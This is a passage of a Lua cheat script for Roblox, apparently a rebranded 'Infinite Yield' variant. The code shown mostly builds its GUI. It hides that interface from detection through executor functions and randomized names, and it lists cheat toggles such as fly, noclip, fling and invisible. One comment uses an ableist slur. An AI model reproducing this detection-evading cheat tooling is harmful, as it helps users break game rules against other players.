if IY_LOADED and not _G.IY_DEBUG == true then
	error("Admin Hub is already running!",0)
	return
end

pcall(function() getgenv().IY_LOADED  = true end)

if not game:IsLoaded() then
	local notLoaded = Instance.new("Message",workspace)
	notLoaded.Text = 'Admin Hub is waiting for the game to load'
	game.Loaded:Wait()
	notLoaded:Destroy()
end

ver = '4.9'

Players = game:GetService("Players")

Holder = Instance.new("Frame")
Title = Instance.new("TextLabel")
Dark = Instance.new("Frame")
Cmdbar = Instance.new("TextBox")
CMDsF = Instance.new("ScrollingFrame")
SettingsButton = Instance.new("ImageButton")
ColorsButton = Instance.new("ImageButton")
Settings = Instance.new("Frame")
Prefix = Instance.new("TextLabel")
PrefixBox = Instance.new("TextBox")
Keybinds = Instance.new("TextLabel")
StayOpen = Instance.new("TextLabel")
Button = Instance.new("Frame")
On = Instance.new("TextButton")
Positions = Instance.new("TextLabel")
EventBind = Instance.new("TextLabel")
Plugins = Instance.new("TextLabel")
Example = Instance.new("TextButton")
Notification = Instance.new("Frame")
Title_2 = Instance.new("TextLabel")
Text_2 = Instance.new("TextLabel")
CloseButton = Instance.new("TextButton")
CloseImage = Instance.new("ImageLabel")
Tooltip = Instance.new("Frame")
Title_3 = Instance.new("TextLabel")
Description = Instance.new("TextLabel")
IntroBackground = Instance.new("Frame")
Logo = Instance.new("ImageLabel")
Credits = Instance.new("TextBox")
KeybindsFrame = Instance.new("Frame")
Close = Instance.new("TextButton")
Add = Instance.new("TextButton")
Delete = Instance.new("TextButton")
Holder_2 = Instance.new("ScrollingFrame")
Example_2 = Instance.new("Frame")
Text_3 = Instance.new("TextLabel")
Delete_2 = Instance.new("TextButton")
KeybindEditor = Instance.new("Frame")
background_2 = Instance.new("Frame")
Dark_4 = Instance.new("Frame")
Directions = Instance.new("TextLabel")
BindTo = Instance.new("TextButton")
Add_2 = Instance.new("TextButton")
Cmdbar_2 = Instance.new("TextBox")
Toggles = Instance.new("ScrollingFrame")
Fly = Instance.new("TextLabel")
Select_3 = Instance.new("TextButton")
Noclip = Instance.new("TextLabel")
Select_4 = Instance.new("TextButton")
Float = Instance.new("TextLabel")
Select_5 = Instance.new("TextButton")
ClickTP = Instance.new("TextLabel")
Select_6 = Instance.new("TextButton")
ClickDelete = Instance.new("TextLabel")
Select_13 = Instance.new("TextButton") 
Xray = Instance.new("TextLabel")
Select_10 = Instance.new("TextButton")
Swim = Instance.new("TextLabel")
Select_11 = Instance.new("TextButton")
Fling = Instance.new("TextLabel")
Select_12 = Instance.new("TextButton")
Invisible = Instance.new("TextLabel")
Select_14 = Instance.new("TextButton")
Vehiclefly = Instance.new("TextLabel")
Select_15 = Instance.new("TextButton")
VehicleNoclip = Instance.new("TextLabel")
Select_16 = Instance.new("TextButton")
shadow_2 = Instance.new("Frame")
PopupText_2 = Instance.new("TextLabel")
Exit_2 = Instance.new("TextButton")
ExitImage_2 = Instance.new("ImageLabel")
PositionsFrame = Instance.new("Frame")
Close_3 = Instance.new("TextButton")
Delete_5 = Instance.new("TextButton")
Part = Instance.new("TextButton")
Holder_4 = Instance.new("ScrollingFrame")
Example_4 = Instance.new("Frame")
Text_5 = Instance.new("TextLabel")
Delete_6 = Instance.new("TextButton")
TP = Instance.new("TextButton")
AliasesFrame = Instance.new("Frame")
Close_2 = Instance.new("TextButton")
Delete_3 = Instance.new("TextButton")
Holder_3 = Instance.new("ScrollingFrame")
Example_3 = Instance.new("Frame")
Text_4 = Instance.new("TextLabel")
Delete_4 = Instance.new("TextButton")
Aliases = Instance.new("TextLabel")
PluginsFrame = Instance.new("Frame")
Close_4 = Instance.new("TextButton")
Add_3 = Instance.new("TextButton")
Holder_5 = Instance.new("ScrollingFrame")
Example_5 = Instance.new("Frame")
Text_6 = Instance.new("TextLabel")
Delete_7 = Instance.new("TextButton")
PluginEditor = Instance.new("Frame")
background_3 = Instance.new("Frame")
Dark_9 = Instance.new("Frame")
Img = Instance.new("ImageButton")
AddPlugin = Instance.new("TextButton")
FileName = Instance.new("TextBox")
About = Instance.new("TextLabel")
Directions_2 = Instance.new("TextLabel")
shadow_3 = Instance.new("Frame")
PopupText_3 = Instance.new("TextLabel")
Exit_3 = Instance.new("TextButton")
ExitImage_3 = Instance.new("ImageLabel")
AliasHint = Instance.new("TextLabel")
PluginsHint = Instance.new("TextLabel")
PositionsHint = Instance.new("TextLabel")
ToPartFrame = Instance.new("Frame")
background_5 = Instance.new("Frame")
ChoosePart = Instance.new("TextButton")
CopyPath = Instance.new("TextButton")
Directions_4 = Instance.new("TextLabel")
Path = Instance.new("TextLabel")
shadow_4 = Instance.new("Frame")
PopupText_5 = Instance.new("TextLabel")
Exit_4 = Instance.new("TextButton")
ExitImage_5 = Instance.new("ImageLabel")
logs = Instance.new("Frame")
shadow = Instance.new("Frame")
Hide = Instance.new("TextButton")
ImageLabel = Instance.new("ImageLabel")
PopupText = Instance.new("TextLabel")
Exit = Instance.new("TextButton")
ImageLabel_2 = Instance.new("ImageLabel")
background = Instance.new("Frame")
chat = Instance.new("Frame")
Clear = Instance.new("TextButton")
SaveChatlogs = Instance.new("TextButton")
Toggle = Instance.new("TextButton")
scroll_2 = Instance.new("ScrollingFrame")
join = Instance.new("Frame")
Toggle_2 = Instance.new("TextButton")
Clear_2 = Instance.new("TextButton")
scroll_3 = Instance.new("ScrollingFrame")
listlayout = Instance.new("UIListLayout",scroll_3)
selectChat = Instance.new("TextButton")
selectJoin = Instance.new("TextButton")

function randomString()
	local length = math.random(10,20)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

COREGUI = game:GetService("CoreGui")
PARENT = nil
if (not is_sirhurt_closure) and (syn and syn.protect_gui) then --sirhurt is retarded
	local Main = Instance.new("ScreenGui")
	Main.Name = randomString()
	syn.protect_gui(Main)
	Main.Parent = COREGUI
	PARENT = Main
elseif get_hidden_gui or gethui then
	local hiddenUI = get_hidden_gui or gethui
	local Main = Instance.new("ScreenGui")
	Main.Name = randomString()
	Main.Parent = hiddenUI()
	PARENT = Main
elseif COREGUI:FindFirstChild('RobloxGui') then
	PARENT = COREGUI.RobloxGui
else
	local Main = Instance.new("ScreenGui")
	Main.Name = randomString()
	Main.Parent = COREGUI
	PARENT = Main
end

shade1 = {}
shade2 = {}
shade3 = {}
text1 = {}
text2 = {}
scroll = {}

Holder.Name = randomString()
Holder.Parent = PARENT
Holder.Active = true
Holder.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Holder.BorderSizePixel = 0
Holder.Position = UDim2.new(1, -250, 1, -220)
Holder.Size = UDim2.new(0, 250, 0, 220)
Holder.ZIndex = 10
table.insert(shade2,Holder)

Title.Name = "Title"
Title.Parent = Holder
Title.Active = true
Title.BackgroundColor3 = Color3.fromRGB(36,36,37)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 250, 0, 20)
Title.Font = Enum.Font.SourceSans
Title.TextSize = 18
Title.Text = "🎄 Admin Hub FE v"..ver.."  🎁"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.ZIndex = 10
table.insert(shade1,Title)
table.insert(text1,Title)

Dark.Name = "Dark"
Dark.Parent = Holder
Dark.Active = true
Dark.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Dark.BorderSizePixel = 0
Dark.Position = UDim2.new(0, 0, 0, 45)
Dark.Size = UDim2.new(0, 250, 0, 175)
Dark.ZIndex = 10
table.insert(shade1,Dark)

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = Holder
Cmdbar.BackgroundTransparency = 1
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(0, 5, 0, 20)
Cmdbar.Size = UDim2.new(0, 240, 0, 25)
Cmdbar.Font = Enum.Font.SourceSans
Cmdbar.TextSize = 18
Cmdbar.TextXAlignment = Enum.TextXAlignment.Left
Cmdbar.TextColor3 = Color3.new(1, 1, 1)
Cmdbar.Text = ""
Cmdbar.ZIndex = 10
Cmdbar.PlaceholderText = "Command Bar"

CMDsF.Name = "CMDs"
CMDsF.Parent = Holder
CMDsF.BackgroundTransparency = 1
CMDsF.BorderSizePixel = 0
CMDsF.Position = UDim2.new(0, 0, 0, 45)
CMDsF.Size = UDim2.new(0, 250, 0, 175)
CMDsF.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
CMDsF.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.ScrollBarThickness = 8
CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
CMDsF.VerticalScrollBarInset = 'Always'
CMDsF.ZIndex = 10
table.insert(scroll,CMDsF)

SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = Holder
SettingsButton.BackgroundTransparency = 1
SettingsButton.Position = UDim2.new(0, 230, 0, 0)
SettingsButton.Size = UDim2.new(0, 20, 0, 20)
SettingsButton.Image = "rbxassetid://1204397029"
SettingsButton.ZIndex = 10

ReferenceButton = Instance.new("ImageButton")
ReferenceButton.Name = "ReferenceButton"
ReferenceButton.Parent = Holder
ReferenceButton.BackgroundTransparency = 1
ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
ReferenceButton.Image = "rbxassetid://3523243755"
ReferenceButton.ZIndex = 10

Settings.Name = "Settings"
Settings.Parent = Holder
Settings.Active = true
Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0, 220)
Settings.Size = UDim2.new(0, 250, 0, 175)
Settings.ZIndex = 10
table.insert(shade1,Settings)

SettingsHolder = Instance.new("ScrollingFrame")
SettingsHolder.Name = "Holder"
SettingsHolder.Parent = Settings
SettingsHolder.BackgroundTransparency = 1
SettingsHolder.BorderSizePixel = 0
SettingsHolder.Size = UDim2.new(1,0,1,0)
SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.ScrollBarThickness = 8
SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
SettingsHolder.VerticalScrollBarInset = 'Always'
SettingsHolder.ZIndex = 10
table.insert(scroll,SettingsHolder)

Prefix.Name = "Prefix"
Prefix.Parent = SettingsHolder
Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Prefix.BorderSizePixel = 0
Prefix.BackgroundTransparency = 1
Prefix.Position = UDim2.new(0, 5, 0, 5)
Prefix.Size = UDim2.new(1, -10, 0, 20)
Prefix.Font = Enum.Font.SourceSans
Prefix.TextSize = 14
Prefix.Text = "Prefix"
Prefix.TextColor3 = Color3.new(1, 1, 1)
Prefix.TextXAlignment = Enum.TextXAlignment.Left
Prefix.ZIndex = 10
table.insert(shade2,Prefix)
table.insert(text1,Prefix)

PrefixBox.Name = "PrefixBox"
PrefixBox.Parent = Prefix
PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
PrefixBox.BorderSizePixel = 0
PrefixBox.Position = UDim2.new(1, -20, 0, 0)
PrefixBox.Size = UDim2.new(0, 20, 0, 20)
PrefixBox.Font = Enum.Font.SourceSansBold
PrefixBox.TextSize = 14
PrefixBox.Text = ''
PrefixBox.TextColor3 = Color3.new(0, 0, 0)
PrefixBox.ZIndex = 10
table.insert(shade3,PrefixBox)
table.insert(text2,PrefixBox)

function makeSettingsButton(name,iconID,off)
	local button = Instance.new("TextButton")
	button.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	button.BorderSizePixel = 0
	button.Position = UDim2.new(0,0,0,0)
	button.Size = UDim2.new(1,0,0,25)
	button.Text = ""
	button.ZIndex = 10
	local icon = Instance.new("ImageLabel")
	icon.Name = "Icon"
	icon.Parent = button
	icon.Position = UDim2.new(0,5,0,5)
	icon.Size = UDim2.new(0,16,0,16)
	icon.BackgroundTransparency = 1
	icon.Image = iconID
	icon.ZIndex = 10
	if off then
		icon.ScaleType = Enum.ScaleType.Crop
		icon.ImageRectSize = Vector2.new(16,16)
		icon.ImageRectOffset = Vector2.new(off,0)
	end
	local label = Instance.new("TextLabel")
	label.Name = "ButtonLabel"
	label.Parent = button
	label.BackgroundTransparency = 1
	label.Text = name
	label.Position = UDim2.new(0,28,0,0)
	label.Size = UDim2.new(1,-28,1,0)
	label.Font = Enum.Font.SourceSans
	label.TextColor3 = Color3.new(1, 1, 1)
	label.TextSize = 14
	label.ZIndex = 10
	label.TextXAlignment = Enum.TextXAlignment.Left
	table.insert(shade2,button)
	table.insert(text1,label)
	return button
end

ColorsButton = makeSettingsButton("Edit Theme","rbxassetid://4911962991")
ColorsButton.Position = UDim2.new(0,5,0,55)
ColorsButton.Size = UDim2.new(1,-10,0,25)
ColorsButton.Name = "Colors"
ColorsButton.Parent = SettingsHolder

Keybinds = makeSettingsButton("Edit Keybinds","rbxassetid://129697930")
Keybinds.Position = UDim2.new(0, 5, 0, 85)
Keybinds.Size = UDim2.new(1, -10, 0, 25)
Keybinds.Name = "Keybinds"
Keybinds.Parent = SettingsHolder

Aliases = makeSettingsButton("Edit Aliases","rbxassetid://5147488658")
Aliases.Position = UDim2.new(0, 5, 0, 115)
Aliases.Size = UDim2.new(1, -10, 0, 25)
Aliases.Name = "Aliases"
Aliases.Parent = SettingsHolder

StayOpen.Name = "StayOpen"
StayOpen.Parent = SettingsHolder
StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
StayOpen.BorderSizePixel = 0
StayOpen.BackgroundTransparency = 1
StayOpen.Position = UDim2.new(0, 5, 0, 30)
StayOpen.Size = UDim2.new(1, -10, 0, 20)
StayOpen.Font = Enum.Font.SourceSans
StayOpen.TextSize = 14
StayOpen.Text = "Keep Menu Open"
StayOpen.TextColor3 = Color3.new(1, 1, 1)
StayOpen.TextXAlignment = Enum.TextXAlignment.Left
StayOpen.ZIndex = 10
table.insert(shade2,StayOpen)
table.insert(text1,StayOpen)

Button.Name = "Button"
Button.Parent = StayOpen
Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(1, -20, 0, 0)
Button.Size = UDim2.new(0, 20, 0, 20)
Button.ZIndex = 10
table.insert(shade3,Button)

On.Name = "On"
On.Parent = Button
On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
On.BackgroundTransparency = 1
On.BorderSizePixel = 0
On.Position = UDim2.new(0, 2, 0, 2)
On.Size = UDim2.new(0, 16, 0, 16)
On.Font = Enum.Font.SourceSans
On.FontSize = Enum.FontSize.Size14
On.Text = ""
On.TextColor3 = Color3.new(0, 0, 0)
On.ZIndex = 10

Positions = makeSettingsButton("Edit/Goto Waypoints","rbxassetid://5147488592")
Positions.Position = UDim2.new(0, 5, 0, 145)
Positions.Size = UDim2.new(1, -10, 0, 25)
Positions.Name = "Waypoints"
Positions.Parent = SettingsHolder

EventBind = makeSettingsButton("Edit Event Binds","rbxassetid://5147695474",759)
EventBind.Position = UDim2.new(0, 5, 0, 205)
EventBind.Size = UDim2.new(1, -10, 0, 25)
EventBind.Name = "EventBinds"
EventBind.Parent = SettingsHolder

Plugins = makeSettingsButton("Manage Plugins","rbxassetid://5147695474",743)
Plugins.Position = UDim2.new(0, 5, 0, 175)
Plugins.Size = UDim2.new(1, -10, 0, 25)
Plugins.Name = "Plugins"
Plugins.Parent = SettingsHolder

Example.Name = "Example"
Example.Parent = Holder
Example.BackgroundTransparency = 1
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 20)
Example.Visible = false
Example.Font = Enum.Font.SourceSans
Example.TextSize = 18
Example.Text = "Example"
Example.TextColor3 = Color3.new(1, 1, 1)
Example.TextXAlignment = Enum.TextXAlignment.Left
Example.ZIndex = 10
table.insert(text1,Example)

Notification.Name = randomString()
Notification.Parent = PARENT
Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Notification.BorderSizePixel = 0
Notification.Position = UDim2.new(1, -500, 1, 20)
Notification.Size = UDim2.new(0, 250, 0, 100)
Notification.ZIndex = 10
table.insert(shade1,Notification)

Title_2.Name = "Title"
Title_2.Parent = Notification
Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 250, 0, 20)
Title_2.Font = Enum.Font.SourceSans
Title_2.TextSize = 14
Title_2.Text = "Notification Title"
Title_2.TextColor3 = Color3.new(1, 1, 1)
Title_2.ZIndex = 10
table.insert(shade2,Title_2)
table.insert(text1,Title_2)

Text_2.Name = "Text"
Text_2.Parent = Notification
Text_2.BackgroundTransparency = 1
Text_2.BorderSizePixel = 0
Text_2.Position = UDim2.new(0, 5, 0, 25)
Text_2.Size = UDim2.new(0, 240, 0, 75)
Text_2.Font = Enum.Font.SourceSans
Text_2.TextSize = 16
Text_2.Text = "Notification Text"
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextWrapped = true
Text_2.ZIndex = 10
table.insert(text1,Text_2)

CloseButton.Name = "CloseButton"
CloseButton.Parent = Notification
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(1, -20, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Text = ""
CloseButton.ZIndex = 10

CloseImage.Parent = CloseButton
CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
CloseImage.BackgroundTransparency = 1
CloseImage.Position = UDim2.new(0, 5, 0, 5)
CloseImage.Size = UDim2.new(0, 10, 0, 10)
CloseImage.Image = "rbxassetid://5054663650"
CloseImage.ZIndex = 10

Tooltip.Name = randomString()
Tooltip.Parent = PARENT
Tooltip.Active = true
Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
Tooltip.BackgroundTransparency = 0.1
Tooltip.BorderSizePixel = 0
Tooltip.Size = UDim2.new(0, 200, 0, 96)
Tooltip.Visible = false
Tooltip.ZIndex = 10
table.insert(shade1,Tooltip)

Title_3.Name = "Title"
Title_3.Parent = Tooltip
Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Title_3.BackgroundTransparency = 0.1
Title_3.BorderSizePixel = 0
Title_3.Size = UDim2.new(0, 200, 0, 20)
Title_3.Font = Enum.Font.SourceSans
Title_3.TextSize = 14
Title_3.Text = ""
Title_3.TextColor3 = Color3.new(1, 1, 1)
Title_3.TextTransparency = 0.1
Title_3.ZIndex = 10
table.insert(shade2,Title_3)
table.insert(text1,Title_3)

Description.Name = "Description"
Description.Parent = Tooltip
Description.BackgroundTransparency = 1
Description.BorderSizePixel = 0
Description.Size = UDim2.new(0,180,0,72)
Description.Position = UDim2.new(0,10,0,18)
Description.Font = Enum.Font.SourceSans
Description.TextSize = 16
Description.Text = ""
Description.TextColor3 = Color3.new(1, 1, 1)
Description.TextTransparency = 0.1
Description.TextWrapped = true
Description.ZIndex = 10
table.insert(text1,Description)

IntroBackground.Name = "IntroBackground"
IntroBackground.Parent = Holder
IntroBackground.Active = true
IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
IntroBackground.BorderSizePixel = 0
IntroBackground.Position = UDim2.new(0, 0, 0, 45)
IntroBackground.Size = UDim2.new(0, 250, 0, 175)
IntroBackground.ZIndex = 10

Logo.Name = "Logo"
Logo.Parent = Holder
Logo.BackgroundTransparency = 1
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0, 125, 0, 127)
Logo.Size = UDim2.new(0, 10, 0, 10)
Logo.Image = ""
Logo.ImageTransparency = 0
Logo.ZIndex = 10

Credits.Name = "Credits"
Credits.Parent = Holder
Credits.BackgroundTransparency = 1
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.9, 30)
Credits.Size = UDim2.new(0, 250, 0, 20)
Credits.Font = Enum.Font.SourceSansLight
Credits.FontSize = Enum.FontSize.Size18
Credits.Text = ""
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.ZIndex = 10

KeybindsFrame.Name = "KeybindsFrame"
KeybindsFrame.Parent = Settings
KeybindsFrame.Active = true
KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
KeybindsFrame.BorderSizePixel = 0
KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
KeybindsFrame.ZIndex = 10
table.insert(shade1,KeybindsFrame)

Close.Name = "Close"
Close.Parent = KeybindsFrame
Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0, 205, 0, 150)
Close.Size = UDim2.new(0, 40, 0, 20)
Close.Font = Enum.Font.SourceSans
Close.TextSize = 14
Close.Text = "Close"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.ZIndex = 10
table.insert(shade2,Close)
table.insert(text1,Close)

Add.Name = "Add"
Add.Parent = KeybindsFrame
Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add.BorderSizePixel = 0
Add.Position = UDim2.new(0, 5, 0, 150)
Add.Size = UDim2.new(0, 40, 0, 20)
Add.Font = Enum.Font.SourceSans
Add.TextSize = 14
Add.Text = "Add"
Add.TextColor3 = Color3.new(1, 1, 1)
Add.ZIndex = 10
table.insert(shade2,Add)
table.insert(text1,Add)

Delete.Name = "Delete"
Delete.Parent = KeybindsFrame
Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0, 50, 0, 150)
Delete.Size = UDim2.new(0, 40, 0, 20)
Delete.Font = Enum.Font.SourceSans
Delete.TextSize = 14
Delete.Text = "Clear"
Delete.TextColor3 = Color3.new(1, 1, 1)
Delete.ZIndex = 10
table.insert(shade2,Delete)
table.insert(text1,Delete)

Holder_2.Name = "Holder"
Holder_2.Parent = KeybindsFrame
Holder_2.BackgroundTransparency = 1
Holder_2.BorderSizePixel = 0
Holder_2.Position = UDim2.new(0, 0, 0, 0)
Holder_2.Size = UDim2.new(0, 250, 0, 145)
Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.ScrollBarThickness = 0
Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Holder_2.VerticalScrollBarInset = 'Always'
Holder_2.ZIndex = 10

Example_2.Name = "Example"
Example_2.Parent = KeybindsFrame
Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Example_2.BorderSizePixel = 0
Example_2.Size = UDim2.new(0, 10, 0, 20)
Example_2.Visible = false
Example_2.ZIndex = 10
table.insert(shade2,Example_2)

Text_3.Name = "Text"
Text_3.Parent = Example_2
Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Text_3.BorderSizePixel = 0
Text_3.Position = UDim2.new(0, 10, 0, 0)
Text_3.Size = UDim2.new(0, 240, 0, 20)
Text_3.Font = Enum.Font.SourceSans
Text_3.TextSize = 14
Text_3.Text = "nom"
Text_3.TextColor3 = Color3.new(1, 1, 1)
Text_3.TextXAlignment = Enum.TextXAlignment.Left
Text_3.ZIndex = 10
table.insert(shade2,Text_3)
table.insert(text1,Text_3)

Delete_2.Name = "Delete"
Delete_2.Parent = Text_3
Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
Delete_2.BorderSizePixel = 0
Delete_2.Position = UDim2.new(0, 200, 0, 0)
Delete_2.Size = UDim2.new(0, 40, 0, 20)
Delete_2.Font = Enum.Font.SourceSans
Delete_2.TextSize = 14
Delete_2.Text = "Delete"
Delete_2.TextColor3 = Color3.new(0, 0, 0)
Delete_2.ZIndex = 10
table.insert(shade3,Delete_2)
table.insert(text2,Delete_2)

KeybindEditor.Name = randomString()
KeybindEditor.Parent = PARENT
KeybindEditor.Active = true
KeybindEditor.BackgroundTransparency = 1
KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
KeybindEditor.ZIndex = 10

background_2.Name = "background"
background_2.Parent = KeybindEditor
background_2.Active = true
background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
background_2.BorderSizePixel = 0
background_2.Position = UDim2.new(0, 0, 0, 20)
background_2.Size = UDim2.new(0, 360, 0, 185)
background_2.ZIndex = 10
table.insert(shade1,background_2)

Dark_4.Name = "Dark"
Dark_4.Parent = background_2
Dark_4.Active = true
Dark_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Dark_4.BorderSizePixel = 0
Dark_4.Position = UDim2.new(0, 135, 0, 0)
Dark_4.Size = UDim2.new(0, 2, 0, 185)
Dark_4.ZIndex = 10
table.insert(shade2,Dark_4)

Directions.Name = "Directions"
Directions.Parent = background_2
Directions.BackgroundTransparency = 1
Directions.BorderSizePixel = 0
Directions.Position = UDim2.new(0, 10, 0, 15)
Directions.Size = UDim2.new(0, 115, 0, 90)
Directions.Font = Enum.Font.SourceSans
Directions.TextSize = 14
Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
Directions.TextColor3 = Color3.new(1, 1, 1)
Directions.TextWrapped = true
Directions.TextYAlignment = Enum.TextYAlignment.Top
Directions.ZIndex = 10
table.insert(text1,Directions)

BindTo.Name = "BindTo"
BindTo.Parent = background_2
BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
BindTo.BorderSizePixel = 0
BindTo.Position = UDim2.new(0, 10, 0, 95)
BindTo.Size = UDim2.new(0, 115, 0, 50)
BindTo.Font = Enum.Font.SourceSans
BindTo.TextSize = 16
BindTo.Text = "Click to bind"
BindTo.TextColor3 = Color3.new(1, 1, 1)
BindTo.ZIndex = 10
table.insert(shade2,BindTo)
table.insert(text1,BindTo)

BindTrigger = Instance.new("TextLabel")
BindTrigger.Name = "TriggerLabel"
BindTrigger.BackgroundTransparency = 1
BindTrigger.Position = UDim2.new(0, 10, 0, 155)
BindTrigger.Size = UDim2.new(0, 45, 0, 20)
BindTrigger.Font = Enum.Font.SourceSans
BindTrigger.TextSize = 14
BindTrigger.Text = "Trigger:"
BindTrigger.TextColor3 = Color3.new(1, 1, 1)
BindTrigger.ZIndex = 10
BindTrigger.TextXAlignment = Enum.TextXAlignment.Left
BindTrigger.Parent = background_2
table.insert(text1,BindTrigger)

BindTriggerSelect = Instance.new("TextButton")
BindTriggerSelect.Name = "BindTo"
BindTriggerSelect.Parent = background_2
BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
BindTriggerSelect.BorderSizePixel = 0
BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
BindTriggerSelect.Font = Enum.Font.SourceSans
BindTriggerSelect.TextSize = 16
BindTriggerSelect.Text = "KeyDown"
BindTriggerSelect.TextColor3 = Color3.new(1, 1, 1)
BindTriggerSelect.ZIndex = 10
table.insert(shade2,BindTriggerSelect)
table.insert(text1,BindTriggerSelect)

Add_2.Name = "Add"
Add_2.Parent = background_2
Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Add_2.BorderSizePixel = 0
Add_2.Position = UDim2.new(0, 310, 0, 20)
Add_2.Size = UDim2.new(0, 40, 0, 20)
Add_2.Font = Enum.Font.SourceSans
Add_2.TextSize = 14
Add_2.Text = "Add"
Add_2.TextColor3 = Color3.new(1, 1, 1)
Add_2.ZIndex = 10
table.insert(shade2,Add_2)
table.insert(text1,Add_2)

Cmdbar_2.Name = "Cmdbar"
Cmdbar_2.Parent = background_2
Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Cmdbar_2.BorderSizePixel = 0
Cmdbar_2.Position = UDim2.new(0, 150, 0, 20)
Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
Cmdbar_2.Font = Enum.Font.SourceSans
Cmdbar_2.TextSize = 14
Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left
Cmdbar_2.TextColor3 = Color3.new(1, 1, 1)
Cmdbar_2.Text = ""
Cmdbar_2.ZIndex = 10
Cmdbar_2.PlaceholderText = "Command"

Toggles.Name = "Toggles"
Toggles.Parent = background_2
Toggles.BackgroundTransparency = 1
Toggles.BorderSizePixel = 0
Toggles.Position = UDim2.new(0, 150, 0, 50)
Toggles.Size = UDim2.new(0, 200, 0, 125)
Toggles.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Toggles.CanvasSize = UDim2.new(0, 0, 0, 270)
Toggles.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Toggles.ScrollBarThickness = 8
Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
Toggles.VerticalScrollBarInset = 'Always'
Toggles.ZIndex = 10
table.insert(scroll,Toggles)

Fly.Name = "Fly"
Fly.Parent = Toggles
Fly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
Fly.BorderSizePixel = 0
Fly.Size = UDim2.new(0, 192, 0, 20)
Fly.Font = Enum.Font.SourceSans
Fly.TextSize = 14
Fly.Text = "    Toggle Fly"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextXAlignment = Enum.TextXAlignment.Left
Fly.ZIndex = 10
table.insert(shade2,Fly)
table.insert(text1,Fly)

Select_3.Name = "Select"
Select_3.Parent = Fly
